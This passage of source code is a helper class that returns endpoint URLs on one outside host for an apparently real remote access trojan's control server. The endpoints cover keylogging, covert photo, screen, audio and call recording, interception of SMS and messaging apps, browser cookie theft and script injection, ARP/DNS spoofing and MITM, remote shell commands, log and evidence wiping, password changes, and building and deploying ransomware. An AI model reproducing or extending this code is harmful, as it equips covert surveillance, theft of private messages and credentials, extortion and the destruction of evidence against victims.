  static String getRatGetKeyloggerStatsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-keylogger-stats";
  }
  
  static String getRatClearKeylogsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-keylogs";
  }
  
  static String getRatExportKeylogsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/export-keylogs";
  }
  
  static String getRatStartClipboardMonitorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-clipboard-monitor";
  }
  
  static String getRatStopClipboardMonitorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-clipboard-monitor";
  }
  
  static String getRatGetClipboardHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-clipboard-history";
  }
  
  static String getRatClearClipboardHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-clipboard-history";
  }
  
  static String getRatStartScreenRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-screen-recording";
  }
  
  static String getRatStopScreenRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-screen-recording";
  }
  
  static String getRatGetScreenRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-screen-recording";
  }
  
  static String getRatStartScreenRecordingAudioUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-screen-recording-audio";
  }
  
  static String getRatTakeScreenshotSilentUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-screenshot-silent";
  }
  
  static String getRatTakeBurstScreenshotsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-burst-screenshots";
  }
  
  static String getRatTakeScreenshotMetadataUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-screenshot-metadata";
  }
  
  static String getRatStartAudioRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-audio-recording";
  }
  
  static String getRatStopAudioRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-audio-recording";
  }
  
  static String getRatGetAudioRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-audio-recording";
  }
  
  static String getRatStartAudioStreamingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-audio-streaming";
  }
  
  static String getRatStopAudioStreamingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-audio-streaming";
  }
  
  static String getRatStartHqAudioRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-hq-audio-recording";
  }
  
  static String getRatSetAudioQualityUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-audio-quality";
  }
  
  static String getRatGetVideoRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-video-recording";
  }
  
  static String getRatStartBgVideoRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-bg-video-recording";
  }
  
  static String getRatStartVideoStreamingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-video-streaming";
  }
  
  static String getRatStopVideoStreamingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-video-streaming";
  }
  
  static String getRatTakePhotoSilentUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-photo-silent";
  }
  
  static String getRatTakePhotoExifUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-photo-exif";
  }
  
  static String getRatStartRealtimeLocationUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-realtime-location";
  }
  
  static String getRatStopRealtimeLocationUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-realtime-location";
  }
  
  static String getRatGetLocationHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-location-history";
  }
  
  static String getRatClearLocationHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-location-history";
  }
  
  static String getRatGetGeofenceAlertsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-geofence-alerts";
  }
  
  static String getRatSetGeofenceUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-geofence";
  }
  
  static String getRatStartCallRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-call-recording";
  }
  
  static String getRatStopCallRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-call-recording";
  }
  
  static String getRatGetCallRecordsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-call-records";
  }
  
  static String getRatDeleteCallRecordUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-call-record";
  }
  
  static String getRatStartSmsInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-sms-interceptor";
  }
  
  static String getRatStopSmsInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-sms-interceptor";
  }
  
  static String getRatGetSmsConversationsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-sms-conversations";
  }
  
  static String getRatSendSmsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-sms";
  }
  
  static String getRatSendSmsBulkUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-sms-bulk";
  }
  
  static String getRatDeleteAllSmsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-all-sms";
  }
  
  static String getRatStartWaInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-wa-interceptor";
  }
  
  static String getRatStopWaInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-wa-interceptor";
  }
  
  static String getRatGetWaMessagesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-messages";
  }
  
  static String getRatGetWaContactsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-contacts";
  }
  
  static String getRatGetWaGroupsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-groups";
  }
  
  static String getRatSendWaMessageUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-wa-message";
  }
  
  static String getRatGetWaStatusUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-status";
  }
  
  static String getRatSetWaStatusUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-wa-status";
  }
  
  static String getRatStartTgInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-tg-interceptor";
  }
  
  static String getRatStopTgInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-tg-interceptor";
  }
  
  static String getRatGetTgMessagesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-messages";
  }
  
  static String getRatGetTgContactsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-contacts";
  }
  
  static String getRatGetTgGroupsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-groups";
  }
  
  static String getRatSendTgMessageUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-tg-message";
  }
  
  static String getRatStartIgInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-ig-interceptor";
  }
  
  static String getRatStopIgInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-ig-interceptor";
  }
  
  static String getRatGetIgMessagesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-ig-messages";
  }
  
  static String getRatSendIgMessageUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-ig-message";
  }
  
  static String getRatStartFbInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-fb-interceptor";
  }
  
  static String getRatStopFbInterceptorUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-fb-interceptor";
  }
  
  static String getRatGetFbMessagesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-fb-messages";
  }
  
  static String getRatSendFbMessageUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-fb-message";
  }
  
  static String getRatGetBrowserBookmarksUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-bookmarks";
  }
  
  static String getRatGetBrowserDownloadsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-downloads";
  }
  
  static String getRatGetBrowserCookiesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-cookies";
  }
  
  static String getRatGetBrowserExtensionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-extensions";
  }
  
  static String getRatGetBrowserTabsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-tabs";
  }
  
  static String getRatClearBrowserCacheUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-browser-cache";
  }
  
  static String getRatClearBrowserHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-browser-history";
  }
  
  static String getRatInjectBrowserScriptUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/inject-browser-script";
  }
  
  static String getRatCloseBrowserTabUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/close-browser-tab";
  }
  
  static String getRatOpenBrowserTabUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/open-browser-tab";
  }
  
  static String getRatStartPacketCaptureUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-packet-capture";
  }
  
  static String getRatStopPacketCaptureUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-packet-capture";
  }
  
  static String getRatGetPacketCaptureUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-packet-capture";
  }
  
  static String getRatStartMitmUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-mitm";
  }
  
  static String getRatStopMitmUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-mitm";
  }
  
  static String getRatScanNetworkUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/scan-network";
  }
  
  static String getRatGetConnectedDevicesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-connected-devices";
  }
  
  static String getRatPortScanUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/port-scan";
  }
  
  static String getRatArpSpoofUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/arp-spoof";
  }
  
  static String getRatDnsSpoofUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/dns-spoof";
  }
  
  static String getRatGetNetworkStatsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-network-stats";
  }
  
  static String getRatGetNetworkConnectionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-network-connections";
  }
  
  static String getRatGetFileInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-file-info";
  }
  
  static String getRatGetDirectorySizeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-directory-size";
  }
  
  static String getRatCopyFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/copy-file";
  }
  
  static String getRatMoveFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/move-file";
  }
  
  static String getRatRenameFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/rename-file";
  }
  
  static String getRatCreateDirectoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-directory";
  }
  
  static String getRatRemoveDirectoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remove-directory";
  }
  
  static String getRatZipFilesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/zip-files";
  }
  
  static String getRatUnzipFilesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/unzip-files";
  }
  
  static String getRatEncryptFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/encrypt-file";
  }
  
  static String getRatDecryptFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/decrypt-file";
  }
  
  static String getRatGetSecurityLogUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-security-log";
  }
  
  static String getRatClearSecurityLogUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-security-log";
  }
  
  static String getRatGetEncryptionKeyUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-encryption-key";
  }
  
  static String getRatSetEncryptionKeyUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-encryption-key";
  }
  
  static String getRatEnableSecureModeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-secure-mode";
  }
  
  static String getRatDisableSecureModeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-secure-mode";
  }
  
  static String getRatSetFirewallRuleUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-firewall-rule";
  }
  
  static String getRatRemoveFirewallRuleUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remove-firewall-rule";
  }
  
  static String getRatGetFirewallRulesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-firewall-rules";
  }
  
  static String getRatEnableAntivirusScanUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-antivirus-scan";
  }
  
  static String getRatGetAntivirusResultUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-antivirus-result";
  }
  
  static String getRatGetUserAccountsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-user-accounts";
  }
  
  static String getRatCreateUserAccountUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-user-account";
  }
  
  static String getRatDeleteUserAccountUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-user-account";
  }
  
  static String getRatChangeUserPasswordUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-user-password";
  }
  
  static String getRatSetUserPermissionUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-user-permission";
  }
  
  static String getRatGetUserPermissionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-user-permissions";
  }
  
  static String getRatLockUserAccountUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-user-account";
  }
  
  static String getRatUnlockUserAccountUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/unlock-user-account";
  }
  
  static String getRatEnableGuestModeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-guest-mode";
  }
  
  static String getRatDisableGuestModeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-guest-mode";
  }
  
  static String getRatGetSystemInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-system-info";
  }
  
  static String getRatGetHardwareInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-hardware-info";
  }
  
  static String getRatGetOsInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-os-info";
  }
  
  static String getRatGetKernelInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-kernel-info";
  }
  
  static String getRatGetCpuInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-cpu-info";
  }
  
  static String getRatGetMemoryInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-memory-info";
  }
  
  static String getRatGetDiskInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-disk-info";
  }
  
  static String getRatGetRunningTasksUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-running-tasks";
  }
  
  static String getRatKillProcessUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/kill-process";
  }
  
  static String getRatWipeEvidenceUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-evidence";
  }
  
  static String getRatWipeLogsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-logs";
  }
  
  static String getRatWipeCacheUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-cache";
  }
  
  static String getRatWipeTempFilesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-temp-files";
  }
  
  static String getRatWipeRecentFilesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-recent-files";
  }
  
  static String getRatWipeClipboardHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-clipboard-history";
  }
  
  static String getRatWipeSearchHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-search-history";
  }
  
  static String getRatWipeLocationHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-location-history";
  }
  
  static String getRatWipeCallHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-call-history";
  }
  
  static String getRatWipeSmsHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-sms-history";
  }
  
  static String getRatWipeAllUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-all";
  }
  
  static String getRatStartRemoteDesktopUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-remote-desktop";
  }
  
  static String getRatStopRemoteDesktopUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-remote-desktop";
  }
  
  static String getRatRemoteDesktopMouseUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-mouse";
  }
  
  static String getRatRemoteDesktopKeyboardUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-keyboard";
  }
  
  static String getRatRemoteDesktopSendKeysUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-send-keys";
  }
  
  static String getRatRemoteDesktopClickUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-click";
  }
  
  static String getRatRemoteDesktopScrollUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-scroll";
  }
  
  static String getRatAutoTapUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-tap";
  }
  
  static String getRatAutoSwipeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-swipe";
  }
  
  static String getRatAutoClickUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-click";
  }
  
  static String getRatAutoScrollUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-scroll";
  }
  
  static String getRatAutoTypeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-type";
  }
  
  static String getRatRecordActionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/record-actions";
  }
  
  static String getRatStopRecordActionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-record-actions";
  }
  
  static String getRatPlayActionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/play-actions";
  }
  
  static String getRatLoopActionsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/loop-actions";
  }
  
  static String getRatSetAutoResponseUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-auto-response";
  }
  
  static String getRatSetAutoReplyUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-auto-reply";
  }
  
  static String getRatAiAnalyzeScreenUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-screen";
  }
  
  static String getRatAiAnalyzePhotoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-photo";
  }
  
  static String getRatAiAnalyzeAudioUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-audio";
  }
  
  static String getRatAiAnalyzeTextUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-text";
  }
  
  static String getRatAiAnalyzeLocationUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-location";
  }
  
  static String getRatAiGenerateReportUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-generate-report";
  }
  
  static String getRatAiSummarizeChatUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-summarize-chat";
  }
  
  static String getRatAiTranslateUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-translate";
  }
  
  static String getRatAiSuggestReplyUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-suggest-reply";
  }
  
  static String getRatChangeLockPasswordUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-lock-password";
  }
  
  static String getRatSetScreenLockUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-screen-lock";
  }
  
  static String getRatChangeSystemPasswordUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-system-password";
  }
  
  static String getRatResetLockPasswordUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/reset-lock-password";
  }
  
  static String getRatSetScreenBrightnessUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-screen-brightness";
  }
  
  static String getRatGetScreenBrightnessUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-screen-brightness";
  }
  
  static String getRatSetAutoRotateUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-auto-rotate";
  }
  
  static String getRatSetScreenTimeoutUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-screen-timeout";
  }
  
  static String getRatSetAirplaneModeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-airplane-mode";
  }
  
  static String getRatSetWifiHotspotUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-wifi-hotspot";
  }

  // ==================== ULTIMATE 6 HELPERS ====================
  
  static String getRatStartLiveLocationUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-live-location";
  }
  
  static String getRatStopLiveLocationUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-live-location";
  }
  
  static String getRatGetLiveLocationUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-live-location";
  }
  
  static String getRatSendShellCommandUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-shell-command";
  }
  
  static String getRatGetShellOutputUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-shell-output";
  }
  
  static String getRatStartOverlayUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-overlay";
  }
  
  static String getRatStopOverlayUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-overlay";
  }
  
  static String getRatStartScreenMirroringUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-screen-mirroring";
  }
  
  static String getRatStopScreenMirroringUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-screen-mirroring";
  }
  
  static String getRatCreateWebRTCSessionUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-web-rtc-session";
  }
  
  static String getRatGetWebRTCSessionUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-web-rtc-session";
  }
  
  static String getRatBuildRansomwareUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/build-ransomware";
  }
  
  static String getRatDeployRansomwareUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/deploy-ransomware";
  }
}